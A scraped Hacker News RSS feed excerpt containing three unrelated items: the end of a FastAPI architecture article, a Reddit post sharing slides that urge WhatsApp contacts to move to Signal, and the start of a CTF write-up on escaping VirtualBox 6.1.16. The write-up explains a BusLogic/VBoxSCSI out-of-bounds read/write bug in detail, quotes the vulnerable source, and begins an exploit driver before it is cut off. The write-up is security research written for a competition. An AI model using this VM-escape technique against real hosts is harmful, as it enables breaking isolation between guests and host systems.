<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItemBase(BaseModel)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    description: </span><span data-v-3d5c50e8="">str</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItemCreate(FooItemBase)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    public: </span><span data-v-3d5c50e8="">bool</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItem(FooItemBase)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">id</span><span data-v-3d5c50e8="">: </span><span data-v-3d5c50e8="">int</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> Config</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">        orm_mode </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">True</span></span></code></pre></div>
<p data-v-3d5c50e8="">SQLAlchemy models are defined in the <code data-v-3d5c50e8="">models</code> package. They define how data is stored within the relational database. They are referenced from <code data-v-3d5c50e8="">AppCRUD</code>. If needed, make sure to differentiate between <code data-v-3d5c50e8="">FooItem</code> models (SQLAlchemy) and <code data-v-3d5c50e8="">FooItem</code> schemas (Pydantic) by appropriate import namespacing.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooItem(Base)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    __tablename__ </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"foo_items"</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">id</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Column(Integer, </span><span data-v-3d5c50e8="">primary_key</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">True</span><span data-v-3d5c50e8="">, </span><span data-v-3d5c50e8="">index</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">True</span><span data-v-3d5c50e8="">)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    description </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Column(String)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    public </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Column(Boolean, </span><span data-v-3d5c50e8="">default</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">False</span><span data-v-3d5c50e8="">)</span></span></code></pre></div>
<h2 id="exception-handling" data-v-3d5c50e8="">Exception Handling</h2>
<p data-v-3d5c50e8="">App exceptions are implemented in the <code data-v-3d5c50e8="">utils</code> package. First, <code data-v-3d5c50e8="">AppExceptionCase</code> is subclassed from base <code data-v-3d5c50e8="">Exception</code> and includes various attributes for defining custom app exception scenarios. The exception handler with the task of handling custom app exceptions (added to <code data-v-3d5c50e8="">main</code>, see above) is defined with a response containing information about the app exception.</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span><span data-v-594b4fde=""><span data-v-594b4fde="">utils ›</span></span><span data-v-594b4fde="">app_exceptions.py</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> AppExceptionCase(</span><span data-v-3d5c50e8="">Exception</span><span data-v-3d5c50e8="">)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__init__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> status_code</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> context</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">dict</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">__class__</span><span data-v-3d5c50e8="">.</span><span data-v-3d5c50e8="">__name__</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> status_code</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.context </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> context</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__str__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> (</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">"&lt;AppException </span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8=""> - "</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">+</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">"status_code=</span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8=""> - context=</span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.context</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">&gt;"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">        )</span></span>


<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">app_exception_handler</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">request</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> Request</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> exc</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> AppExceptionCase</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">    </span>…</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://camillovisini.com/article/abstracting-fastapi-services/">https://camillovisini.com/article/abstracting-fastapi-services/</a></em></p>]]>
            </description>
            <link>https://camillovisini.com/article/abstracting-fastapi-services/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25797140</guid>
            <pubDate>Fri, 15 Jan 2021 22:03:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WhatsApp Status to convince your family and friends to switch to Signal]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25796535">thread link</a>) | @karlzt
<br/>
January 15, 2021 | https://teddit.net/r/signal/comments/kwovyz/whatsapp_status_to_convince_your_family_friends/ | <a href="https://web.archive.org/web/*/https://teddit.net/r/signal/comments/kwovyz/whatsapp_status_to_convince_your_family_friends/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><!-- SC_OFF --><div><p><strong>**UPDATE: Ready to use after WA announced T&amp;C delay! New languages: Slovak, Czech, Portuguese (PT), Finnish, Turkish, Hindi, Spanish, Portuguese (BR), Italian, French, Dutch - more coming soon*\</strong>*</p>

<blockquote>
<p>Hey there, I'm using Signal!</p>
</blockquote>

<p>When people switch to Signal they often have the problem to convince all their contacts from WhatsApp to do the same. I had that struggle too.</p>

<p>That's why I created something to put into my WhatsApp Status: around 20 slides explaining why to switch and why I am going to delete WhatsApp. I think it's better to be educational than pushy or insulting to get people to switch, so I tried it this way and successfully got my family and friends to switch to Signal.</p>

<p>Now I decided to share the slides with you and hope they help you too!</p>



<p>There are 2 versions for each language: One including a comment about GDPR (for EU citizens) and one that does not mention anything about GDPR (rest of world).</p>

<p>F<em>or UK users:</em> <a href="https://teddit.net/u/Winnie_the_Pooch">u/Winnie_the_Pooch</a> <em>commented: "[...] use the EU version. Even though weâ€™ve now left, the EU GDPR has (thankfully!) been enshrined in British law as the</em> <a href="https://ico.org.uk/for-organisations/dp-at-the-end-of-the-transition-period/data-protection-now-the-transition-period-has-ended/the-gdpr/"><em>UK GDPR</em></a> <em>[...]". Lucky you!</em></p>



<p>WhatsApp delays their privacy policy update to <strong>mid of may</strong>!</p>

<p><strong>But this does not change the facts mentioned in the slides about metadata etc.!</strong> So, why should you wait until may? On the other hand, you now have more time to convince your contacts to switch!</p>

<p><strong>UPDATE:</strong> I updated each version like the following:</p>

<ul>
<li>The first slide does not have a headline anymore. You can add your own text here using the editing options in WhatsApp (its the T on the top right) or your favorite graphic editing software. Write something along the line as "I will delete WhatsApp on [insert date here]" or similar.</li>
<li>I replaced the last two chat messages on slide 03 with the text from slide 04. Total amount of slides reduced to 19!</li>
</ul>

<p><strong>Before sharing your new WhatsApp Status check if the Signal service is currently up and running:</strong> <a href="https://status.signal.org/">status.signal.org</a> (if it is down you should wait, as your contacts may not be able to register!)</p>



<p>​</p>

<p><strong>Thanks to all translators!</strong></p>

<table><thead>
<tr>
<th></th>
<th><strong>GDPR (for EU citizens)</strong></th>
<th><strong>No GDPR (rest of world)</strong></th>
</tr>
</thead><tbody>
<tr>
<td><strong>English</strong></td>
<td><a href="http://imgbox.com/g/wWfXnKIv9T">images</a> - <a href="https://filehorst.de/d/dsIzayIF">zip file</a></td>
<td><a href="https://imgbox.com/g/bu1G1Nnz8s">images</a> - <a href="https://filehorst.de/d/dxvCmdfH">zip file</a></td>
</tr>
<tr>
<td><strong>German</strong></td>
<td><a href="https://imgbox.com/g/6cGzvJ7JbQ">images</a> - <a href="https://filehorst.de/d/dtaAcwlv">zip file</a></td>
<td><a href="https://imgbox.com/g/KbIM7RBmAb">images</a> - <a href="https://filehorst.de/d/dtwhadvs">zip file</a></td>
</tr>
<tr>
<td><strong>Dutch</strong></td>
<td><a href="http://imgbox.com/g/KZzkrjNlRF">images</a> - <a href="https://filehorst.de/d/dhiGelei">zip file</a></td>
<td><a href="http://imgbox.com/g/no5XE3rLKf">images</a> - <a href="https://filehorst.de/d/dlHoIBJt">zip file</a></td>
</tr>
<tr>
<td><strong>Spanish</strong></td>
<td><a href="http://imgbox.com/g/jDX4co55Vc">images</a> - <a href="https://filehorst.de/d/dcjeAeEt">zip file</a></td>
<td><a href="http://imgbox.com/g/Pc0EkJ9qWh">images</a> - <a href="https://filehorst.de/d/dniedoph">zip file</a></td>
</tr>
<tr>
<td><strong>Portuguese (PT)</strong></td>
<td><a href="http://imgbox.com/g/2MHxmi4VFS">images</a> - <a href="https://filehorst.de/d/dCprbnrk">zip file</a></td>
<td><a href="http://imgbox.com/g/DaPhzju7Ht">images</a> - <a href="https://filehorst.de/d/dbAHawjy">zip file</a></td>
</tr>
<tr>
<td><strong>Portuguese (BR)</strong></td>
<td><a href="http://imgbox.com/g/Qj5taiuaL4">images</a> - <a href="https://filehorst.de/d/dIikBxhn">zip file</a></td>
<td><a href="http://imgbox.com/g/9WBMHYKcwA">images</a> - <a href="https://filehorst.de/d/dfxHgAay">zip file</a></td>
</tr>
<tr>
<td><strong>French</strong></td>
<td><a href="http://imgbox.com/g/5Po0sskqve">images</a> - <a href="https://filehorst.de/d/dAmaJgmw">zip file</a></td>
<td><a href="https://imgbox.com/g/hOwDOt4ORM">images</a> - <a href="https://filehorst.de/d/dkiwkiJw">zip file</a></td>
</tr>
<tr>
<td><strong>Czech</strong></td>
<td><a href="http://imgbox.com/g/BPWPrHxNCA">images</a> - <a href="https://filehorst.de/d/dgEajusf">zip file</a></td>
<td><a href="http://imgbox.com/g/7ThzK6HMyH">images</a> - <a href="https://filehorst.de/d/dinpsFvk">zip file</a></td>
</tr>
<tr>
<td><strong>Italian</strong></td>
<td><a href="http://imgbox.com/g/gT3KmJN3z7">images</a> - <a href="https://filehorst.de/d/dBIfvBvp">zip file</a></td>
<td><a href="http://imgbox.com/g/FT9Z1ROxFO">images</a> - <a href="https://filehorst.de/d/dIdfJagg">zip file</a></td>
</tr>
<tr>
<td><strong>Hindi</strong></td>
<td>please send translation for GDPR part (slide 12)</td>
<td><a href="http://imgbox.com/g/kJg7fHBEjK">images</a> - <a href="https://filehorst.de/d/drszqqzj">zip file</a></td>
</tr>
<tr>
<td><strong>Turkish</strong></td>
<td><a href="http://imgbox.com/g/U3rN7N2pUO">images</a> - <a href="https://filehorst.de/d/dnmqvpEx">zip file</a></td>
<td><a href="http://imgbox.com/g/60YM7Y9K8Q">images</a> - <a href="https://filehorst.de/d/dcyjAfcb">zip file</a></td>
</tr>
<tr>
<td><strong>Polish</strong></td>
<td>coming soon</td>
<td>coming soon</td>
</tr>
<tr>
<td><strong>Arabic</strong></td>
<td>coming soon</td>
<td>coming soon</td>
</tr>
<tr>
<td><strong>Cantonese</strong></td>
<td>coming soon</td>
<td>coming soon</td>
</tr>
<tr>
<td><strong>Finnish</strong></td>
<td><a href="http://imgbox.com/g/7XuhMwwKNU">images</a> - <a href="https://filehorst.de/d/dwymzjaJ">zip file</a></td>
<td><a href="http://imgbox.com/g/yAM6M5vklE">images</a> - <a href="https://filehorst.de/d/dhzrICHj">zip file</a></td>
</tr>
<tr>
<td><strong>Slovak</strong></td>
<td><a href="http://imgbox.com/g/UhzDU5wtuB">images</a> - <a href="https://filehorst.de/d/ddrHhsqh">zip file</a></td>
<td><a href="http://imgbox.com/g/iMIU4IPQJd">images</a> - <a href="https://filehorst.de/d/dweGmCEB">zip file</a></td>
</tr>
</tbody></table>

<p><strong>How to contribute</strong></p>

<p><em>Coming soon</em> means you don't have to send me translations for this language anymore, I just need to add them. Please be patient.</p>

<p>If you like to have the status in your language too: <a href="https://pastebin.com/Fc9Xcadi">here is the raw text</a> (try to not change the formatting please). Please translate only into languages you are fluent in.</p>

<p>!Please also provide a screenshot of the "New privacy policy" message  in your language for the 2nd slide. Search the web if needed!</p>



<p>Please look into related subreddits to get familiar with the topic:</p>

<ul>
<li><a href="https://teddit.net/r/signal">r/signal</a></li>
<li><a href="https://teddit.net/r/whatsapp">r/whatsapp</a></li>
<li><a href="https://teddit.net/r/privacy">r/privacy</a></li>
<li><a href="https://teddit.net/r/privacytoolsIO">r/privacytoolsIO</a></li>
</ul>

<p><strong>How to add WhatsApp Status in the correct order</strong></p>

<ol>
<li>First, take a look in your WhatsApp Status privacy settings and make sure to select all the contacts you want to see your new status.</li>
<li>Open the gallery app.</li>
<li>Select all images, starting from the first slide (1-19).</li>
<li>Press share.</li>
<li>Select WhatsApp.</li>
<li>Select "My Status" &amp; make sure the slides are in the correct order.</li>
<li>Add your custom intro text on slide 01.</li>
<li>Send. Done.</li>
</ol>

<p><strong>Best practices</strong></p>

<p>Think about what time is best to post your status. Think about what your contacts are probably doing at the moment. They might not want to read 20 slides of text while they are at work.</p>

<p>At last position in your story I recommend the video from <a href="https://teddit.net/r/signal/comments/kv54u7/best_signal_video_for_your_whatsapp_status/">this post</a> (credits to <a href="https://teddit.net/u/carlosfx">u/carlosfx</a> !).</p>

<p>Signal published a <a href="https://twitter.com/signalapp/status/1349236175773462532">replacement for your profile pic</a> on their twitter account.</p>

<p><a href="https://teddit.net/u/Xath0n">u/Xath0n</a> suggested to put a text status with a direct link to <a href="https://signal.org/downloads">signal.org/downloads</a> at the end, so people don't need to search for it (Signal is in the top charts in the app stores currently, so it shouldn't be too hard to find anyway).</p>

<p>You can also thank everyone for watching your TED talk, lol.</p>

<p>If you think most of your contacts don't look into WhatsApp Status you can do the following:</p>

<ul>
<li>let them know that you want them to look into your WA Status, because it's important to you</li>
<li>send the slides to your contacts directly or in a group chat</li>
<li>send them the link to the images (note that the mobile view of imgbox is not the best)</li>
</ul>



<ul>
<li>I know that 19+ slides are a lot for a single WhatsApp Status and people might not read it <strong>but it is worth a try.</strong></li>
<li>It is intentionally written in simple terms to be understood by people who are not as tech savvy as you are.</li>
<li>Be prepared for questions, arguments, debates and to provide evidence of what your new status is saying (look up this subreddit for more info). Make sure you know the facts!</li>
<li>The style of the content may not appeal to everyone in your contact list.</li>
<li>Remember that some of your contacts don't look at WA Status at all.</li>
</ul>



<p><strong>Animated Status</strong> (old date)</p>

<p><a href="https://teddit.net/user/JordyEGNL/">u/JordyEGNL</a> submitted an animated version of the EN (for EU citizens) status: <a href="https://teddit.net/r/signal/comments/kx4msl/i_transformed_the_pictures_of_ucrazylizards_post/">check it out</a> !</p>

<p><a href="https://teddit.net/u/candiesdoodle">u/candiesdoodle</a> submitted an animated version of the EN (outside EU) status: <a href="https://filehorst.de/download_mobile.php?file=dxaFzAvF">check it out</a> !</p>

<p><strong>Blank first slide</strong></p>

<p>Some of you asked if I can post the first slide with no text. <a href="https://imgbox.com/g/0FtNwMdC8P">Here it is</a>. Have fun.</p>



<p>The images linked above are published under the <a href="https://creativecommons.org/publicdomain/zero/1.0/">CC0 1.0 Universal (CC0 1.0) Public Domain Dedication</a>. Do whatever you want. No attribution required. Happy sharing!</p>

<p>​</p>

<p>Edit: Removed a weak argument on slide 19 about Telegram. Danke <a href="https://teddit.net/u/A2DreppiD">u/A2DreppiD</a> !</p>

<p>Edit2: Thanks for my first award ever <a href="https://teddit.net/u/TravellingTARDIS">u/TravellingTARDIS</a> !</p>

<p>Edit3: TIL Reddit for iPad messes up my markdown. Sry for that.</p>

<p>Edit4: <strong>THANK YOU ALL FOR THE AWARDS!</strong> Really appreciate it! I'm overwhelmed by the positive feedback and happy to hear that it helped a lot of you. Also: RIP inbox. Sry if I can't reply to all of your comments!</p>

<p>Edit5: there was a line missing in my pastebin for slide 03, thx <a href="https://teddit.net/u/TovaX">u/TovaX</a></p>

<p>Edit6: Added a how-to because many of you asked how to add multiple images to your status!</p>

<p>Edit7: Linked to Signal status page. New animated EN (outside EU) version!</p>
</div><!-- SC_ON --></div></div>]]>
            </description>
            <link>https://teddit.net/r/signal/comments/kwovyz/whatsapp_status_to_convince_your_family_friends/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25796535</guid>
            <pubDate>Fri, 15 Jan 2021 21:10:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Escaping VirtualBox 6.1: Part 1]]>
            </title>
            <description>
<![CDATA[
Score 281 | Comments 30 (<a href="https://news.ycombinator.com/item?id=25795731">thread link</a>) | @lima
<br/>
January 15, 2021 | https://secret.club/2021/01/14/vbox-escape.html | <a href="https://web.archive.org/web/*/https://secret.club/2021/01/14/vbox-escape.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>This post is about a VirtualBox escape for the latest currently available version (VirtualBox 6.1.16 on Windows). The vulnerabilities were discovered and exploited by our team <a href="https://twitter.com/Sauercl0ud">Sauercl0ud</a> as part of the <a href="https://realworldctf.com/">RealWorld CTF 2020/2021</a>.</p><p>The vulnerability was known to the organizers, requires the guest to be able to insert kernel modules and isn’t exploitable on default configurations of VirtualBox so the impact is very limited.</p><p>Many thanks to the organizers for hosting this great competition, especially to ChenNan for creating this challenge, <a href="https://twitter.com/M4x_1997">M4x</a> for always being helpful, answering our questions and sitting with us through the many demo attempts and of course all <a href="#credits">the people involved</a> in writing the exploit.</p><p>Let’s get to some pwning :D</p><h2 id="discovering-the-vulnerability"> <a href="#discovering-the-vulnerability">Discovering the Vulnerability</a></h2><p>The challenge description already hints at where a bug might be:</p><blockquote><p>Goal:</p><p>Please escape VirtualBox and spawn a calc(“C:\Windows\System32\calc.exe”) on the host operating system.</p><p>You have the full permissions of the guest operating system and can do anything in the guest, including loading drivers, etc.</p><p>But you can’t do anything in the host, including modifying the guest configuration file, etc.</p><p><strong>Hint: SCSI controller is enabled and marked as bootable.</strong></p><p>Environment:</p><p>In order to ensure a clean environment, we use virtual machine nesting to build the environment. The details are as follows:</p><ul><li>VirtualBox:6.1.16-140961-Win_x64.</li><li>Host: Windows10_20H2_x64 Virtual machine in Vmware_16.1.0_x64.</li><li>Guest: Windows7_sp1_x64 Virtual machine in VirtualBox_6.1.16_x64.</li></ul></blockquote><p>The only special thing about the VM is that the <code>SCSI</code> driver is loaded and marked bootable so that’s the place for us to start looking for vulnerabilities.</p><p>Here are the operations the <code>SCSI</code> device supports:</p><pre><code><span>// /src/VBox/Devices/Storage/DevBusLogic.cpp</span>
    
    <span>// [...]</span>

    <span>if</span> (fBootable)
    {
        <span>/* Register I/O port space for BIOS access. */</span>
        rc <span>=</span> PDMDevHlpIoPortCreateExAndMap(pDevIns, BUSLOGIC_BIOS_IO_PORT, <span>4</span> <span>/*cPorts*/</span>, <span>0</span> <span>/*fFlags*/</span>,
                                           buslogicR3BiosIoPortWrite,       <span>// Write a byte</span>
                                           buslogicR3BiosIoPortRead,        <span>// Read a byte</span>
                                           buslogicR3BiosIoPortWriteStr,    <span>// Write a string</span>
                                           buslogicR3BiosIoPortReadStr,     <span>// Read a string</span>
                                           <span>NULL</span> <span>/*pvUser*/</span>,
                                           <span>"BusLogic BIOS"</span> , <span>NULL</span> <span>/*paExtDesc*/</span>, <span>&amp;</span>pThis<span>-&gt;</span>hIoPortsBios);
        <span>// [...]</span>
    }
    <span>// [...]</span>
</code></pre><p>The <code>SCSI</code> device implements a simple state machine with a global heap allocated buffer. When initiating the state machine, we can set the buffer size and the state machine will set a global buffer pointer to point to the start of said buffer. From there on, we can either read one or more bytes, or write one or more bytes. Every read/write operation will advance the buffer pointer. This means that after reading a byte from the buffer, we can’t write that same byte and vice versa, because the buffer pointer has already been advanced.</p><p>While auditing the <code>vboxscsiReadString</code> function, <a href="https://twitter.com/_tsuro">tsuro</a> and <a href="https://twitter.com/__spq__">spq</a> found something interesting:</p><pre><code><span>// src/VBox/Devices/Storage/VBoxSCSI.cpp</span>

<span>/**
 * @retval VINF_SUCCESS
 */</span>
<span>int</span> vboxscsiReadString(PPDMDEVINS pDevIns, PVBOXSCSI pVBoxSCSI, <span>uint8_t</span> iRegister,
                       <span>uint8_t</span> <span>*</span>pbDst, <span>uint32_t</span> <span>*</span>pcTransfers, <span>unsigned</span> cb)
{
    RT_NOREF(pDevIns);
    LogFlowFunc((<span>"pDevIns=%#p pVBoxSCSI=%#p iRegister=%d cTransfers=%u cb=%u</span><span>\n</span><span>"</span>,
                 pDevIns, pVBoxSCSI, iRegister, <span>*</span>pcTransfers, cb));

    <span>/*
     * Check preconditions, fall back to non-string I/O handler.
     */</span>
    Assert(<span>*</span>pcTransfers <span>&gt;</span> <span>0</span>);

    <span>/* Read string only valid for data in register. */</span>
    AssertMsgReturn(iRegister <span>==</span> <span>1</span>, (<span>"Hey! Only register 1 can be read from with string!</span><span>\n</span><span>"</span>), VINF_SUCCESS);

    <span>/* Accesses without a valid buffer will be ignored. */</span>
    AssertReturn(pVBoxSCSI<span>-&gt;</span>pbBuf, VINF_SUCCESS);

    <span>/* Check state. */</span>
    AssertReturn(pVBoxSCSI<span>-&gt;</span>enmState <span>==</span> VBOXSCSISTATE_COMMAND_READY, VINF_SUCCESS);
    Assert(<span>!</span>pVBoxSCSI<span>-&gt;</span>fBusy);

    RTCritSectEnter(<span>&amp;</span>pVBoxSCSI<span>-&gt;</span>CritSect);
    <span>/*
     * Also ignore attempts to read more data than is available.
     */</span>
    <span>uint32_t</span> cbTransfer <span>=</span> <span>*</span>pcTransfers <span>*</span> cb;
    <span>if</span> (pVBoxSCSI<span>-&gt;</span>cbBufLeft <span>&gt;</span> <span>0</span>)
    {
        Assert(cbTransfer <span>&lt;=</span> pVBoxSCSI<span>-&gt;</span>cbBuf);     <span>// --- [1] ---</span>
        <span>if</span> (cbTransfer <span>&gt;</span> pVBoxSCSI<span>-&gt;</span>cbBuf)
        {
            memset(pbDst <span>+</span> pVBoxSCSI<span>-&gt;</span>cbBuf, <span>0xff</span>, cbTransfer <span>-</span> pVBoxSCSI<span>-&gt;</span>cbBuf);
            cbTransfer <span>=</span> pVBoxSCSI<span>-&gt;</span>cbBuf;  <span>/* Ignore excess data (not supposed to happen). */</span>
        }

        <span>/* Copy the data and adance the buffer position. */</span>
        memcpy(pbDst, 
               pVBoxSCSI<span>-&gt;</span>pbBuf <span>+</span> pVBoxSCSI<span>-&gt;</span>iBuf,  <span>// --- [2] ---</span>
               cbTransfer);

        <span>/* Advance current buffer position. */</span>
        pVBoxSCSI<span>-&gt;</span>iBuf      <span>+=</span> cbTransfer;
        pVBoxSCSI<span>-&gt;</span>cbBufLeft <span>-=</span> cbTransfer;         <span>// --- [3] ---</span>

        <span>/* When the guest reads the last byte from the data in buffer, clear
           everything and reset command buffer. */</span>

        <span>if</span> (pVBoxSCSI<span>-&gt;</span>cbBufLeft <span>==</span> <span>0</span>)              <span>// --- [4] ---</span>
            vboxscsiReset(pVBoxSCSI, <span>false</span> <span>/*fEverything*/</span>);
    }
    <span>else</span>
    {
        AssertFailed();
        memset(pbDst, <span>0</span>, cbTransfer);
    }
    <span>*</span>pcTransfers <span>=</span> <span>0</span>;
    RTCritSectLeave(<span>&amp;</span>pVBoxSCSI<span>-&gt;</span>CritSect);

    <span>return</span> VINF_SUCCESS;
}
</code></pre><p>We can fully control <code>cbTransfer</code> in this function. The function initially makes sure that we’re not trying to read more than the buffer size <code>[1]</code>. Then, it copies <code>cbTransfer</code> bytes from the global buffer into another buffer <code>[2]</code>, which will be sent to the guest driver. Finally, <code>cbTransfer</code> bytes get subtracted from the remaining size of the buffer <code>[3]</code> and if that remaining size hits zero, it will reset the SCSI device and require the user to reinitiate the machine state, before reading any more bytes.</p><p>So much for the logic, but what’s the issue here? There is a check at <code>[1]</code> that ensures no single read operation reads more than the buffer’s size. But this is the wrong check. It should verify, that no single read can read more than the buffer <strong>has left</strong>. Let’s say we allocate a buffer with a size of 40 bytes. Now we call this function to read 39 bytes. This will advance the buffer pointer to point to the 40th byte. Now we call the function again and tell it to read 2 more bytes. The check in <code>[1]</code> won’t bail out, since 2 is less than the buffer size of 40, however we will have read 41 bytes in total. Additionally, this will cause the subtraction in <code>[3]</code> to underflow and <code>cbBufLeft</code> will be set to <code>UINT32_MAX-1</code>. This same <code>cbBufLeft</code> will be checked when doing write operations and since it is very large now, we’ll be able to also write bytes that are outside of our buffer.</p><h2 id="getting-oob-readwrite"> <a href="#getting-oob-readwrite">Getting OOB read/write</a></h2><p>We understand the vulnerability, so it’s time to develop a driver to exploit it. Ironically enough, the “getting a driver to build” part was actually one of the hardest (and most annoying) parts of the exploit development. <a href="https://twitter.com/fktio">malle</a> got to building VirtualBox from source in order for us to have symbols and a debuggable process while <a href="https://twitter.com/0x4d5aC">0x4d5a</a> came up with the idea of using the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a> driver as a base for us to work with, since it does some similar things to what we need. Now let’s finally start writing some code.</p><p>Here’s how we triggered the bug:</p><pre><code><span>void</span> exploit() {
    <span>static</span> <span>const</span> <span>uint8_t</span> cdb[<span>1</span>] <span>=</span> {<span>0</span>};
    <span>static</span> <span>const</span> <span>short</span> port <span>=</span> <span>0x434</span>;
